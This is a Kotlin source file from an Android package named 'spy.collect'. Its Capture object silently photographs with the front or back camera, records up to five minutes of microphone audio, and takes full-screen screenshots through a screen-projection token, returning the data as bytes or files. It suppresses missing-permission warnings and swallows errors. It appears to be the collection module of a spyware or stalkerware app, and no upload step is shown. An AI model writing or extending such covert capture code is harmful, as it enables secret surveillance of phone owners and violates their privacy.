package com.you.spy.collect

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Size
import android.view.WindowManager
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

object Capture {

    private var projection: MediaProjection? = null

    /**
     * ScreenCaptureActivity se consent milne par yahan token aata hai.
     * Android 14+ par createVirtualDisplay se pehle callback register karna
     * mandatory hai, warna SecurityException.
     */
    fun setProjection(p: MediaProjection) {
        runCatching { projection?.stop() }
        projection = p
        runCatching {
            p.registerCallback(object : MediaProjection.Callback() {}, Handler(Looper.getMainLooper()))
        }
    }

    fun hasProjection(): Boolean = projection != null

    // =========================================================
    // CAMERA
    // =========================================================
    @SuppressLint("MissingPermission")
    fun photo(ctx: Context, front: Boolean): ByteArray? {
        val mgr = runCatching { ctx.getSystemService(CameraManager::class.java) }.getOrNull() ?: return null

        val facing = if (front) CameraCharacteristics.LENS_FACING_FRONT
        else CameraCharacteristics.LENS_FACING_BACK

        val id = runCatching {
            mgr.cameraIdList.firstOrNull { cid ->
                mgr.getCameraCharacteristics(cid).get(CameraCharacteristics.LENS_FACING) == facing
            }
        }.getOrNull() ?: return null

        val chars = runCatching { mgr.getCameraCharacteristics(id) }.getOrNull() ?: return null
        val size = jpegSize(chars)

        val thread = HandlerThread("cam").also { it.start() }
        val handler = Handler(thread.looper)
        val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)

        val latch = CountDownLatch(1)
        val out = AtomicReference<ByteArray?>(null)
        var device: CameraDevice? = null

        reader.setOnImageAvailableListener({ r ->
            try {
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val buf = img.planes[0].buffer
                    val bytes = ByteArray(buf.remaining())
                    buf.get(bytes)
                    out.set(bytes)
                } finally {
                    img.close()
                }
            } catch (_: Throwable) {
            } finally {
                latch.countDown()
            }
        }, handler)

        try {
            runCatching {
                mgr.openCamera(id, object : CameraDevice.StateCallback() {
                    override fun onOpened(cam: CameraDevice) {
                        device = cam
                        val surface = reader.surface
                        runCatching {
                            val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            req.addTarget(surface)
                            cam.createCaptureSession(
                                listOf(surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(s: CameraCaptureSession) {
                                        runCatching { s.capture(req.build(), null, handler) }
                                    }

                                    override fun onConfigureFailed(s: CameraCaptureSession) {
                                        latch.countDown()
                                    }
                                },
                                handler
                            )
                        }.onFailure { latch.countDown() }
                    }

                    override fun onDisconnected(cam: CameraDevice) {
                        runCatching { cam.close() }
                        latch.countDown()
                    }

                    override fun onError(cam: CameraDevice, e: Int) {
                        runCatching { cam.close() }
                        latch.countDown()
                    }
                }, handler)
            }.onFailure { latch.countDown() }

            latch.await(9, TimeUnit.SECONDS)
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
        } finally {
            runCatching { device?.close() }
            runCatching { reader.close() }
            runCatching { thread.quitSafely() }
        }

        return out.get()
    }

    /** Sabse bada JPEG size jo 1920 wide se chhota ho — full-res se dheela nahi hota. */
    private fun jpegSize(chars: CameraCharacteristics): Size {
        val fallback = Size(1280, 960)
        return runCatching {
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                ?: return@runCatching fallback
            val sizes = map.getOutputSizes(ImageFormat.JPEG) ?: return@runCatching fallback
            sizes.filter { it.width <= 1920 }
                .maxByOrNull { it.width.toLong() * it.height }
                ?: sizes.minByOrNull { it.width.toLong() * it.height }
                ?: fallback
        }.getOrDefault(fallback)
    }

    // =========================================================
    // MIC
    // =========================================================
    @Suppress("DEPRECATION")
    @SuppressLint("MissingPermission")
    fun record(ctx: Context, seconds: Int): File? = runCatching {
        val f = File(ctx.cacheDir, "mic_${System.currentTimeMillis()}.m4a")
        val r = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else MediaRecorder()
        try {
            r.setAudioSource(MediaRecorder.AudioSource.MIC)
            r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            r.setAudioEncodingBitRate(96000)
            r.setAudioSamplingRate(44100)
            r.setOutputFile(f.absolutePath)
            r.prepare()
            r.start()
            Thread.sleep(seconds.coerceIn(1, 300) * 1000L)
        } finally {
            runCatching { r.stop() }
            runCatching { r.release() }
        }
        if (f.exists() && f.length() > 0) f else null
    }.getOrNull()

    // =========================================================
    // SCREEN
    // =========================================================
    @Suppress("DEPRECATION")
    fun screen(ctx: Context): ByteArray? {
        val p = projection ?: return null

        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val dm = DisplayMetrics()
        wm.defaultDisplay.getRealMetrics(dm)
        if (dm.widthPixels <= 0 || dm.heightPixels <= 0) return null

        val reader = ImageReader.newInstance(
            dm.widthPixels, dm.heightPixels, PixelFormat.RGBA_8888, 2
        )
        val latch = CountDownLatch(1)
        val out = AtomicReference<ByteArray?>(null)
        var display: VirtualDisplay? = null

        reader.setOnImageAvailableListener({ r ->
            try {
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val plane = img.planes[0]
                    val rowPadding = plane.rowStride - plane.pixelStride * dm.widthPixels
                    val paddedWidth = dm.widthPixels + rowPadding / plane.pixelStride

                    val padded = Bitmap.createBitmap(paddedWidth, dm.heightPixels, Bitmap.Config.ARGB_8888)
                    padded.copyPixelsFromBuffer(plane.buffer)

                    val cropped = Bitmap.createBitmap(padded, 0, 0, dm.widthPixels, dm.heightPixels)
                    val stream = ByteArrayOutputStream()
                    cropped.compress(Bitmap.CompressFormat.JPEG, 70, stream)
                    out.set(stream.toByteArray())

                    if (cropped !== padded) padded.recycle()
                    cropped.recycle()
                } finally {
                    img.close()
                }
            } catch (_: Throwable) {
            } finally {
                latch.countDown()
            }
        }, Handler(Looper.getMainLooper()))

        try {
            runCatching {
                display = p.createVirtualDisplay(
                    "cap",
                    dm.widthPixels,
                    dm.heightPixels,
                    dm.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    reader.surface,
                    null,
                    null
                )
            }.onFailure { latch.countDown() }

            latch.await(5, TimeUnit.SECONDS)
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
        } finally {
            runCatching { display?.release() }
            runCatching { reader.close() }
        }

        return out.get()
    }
}
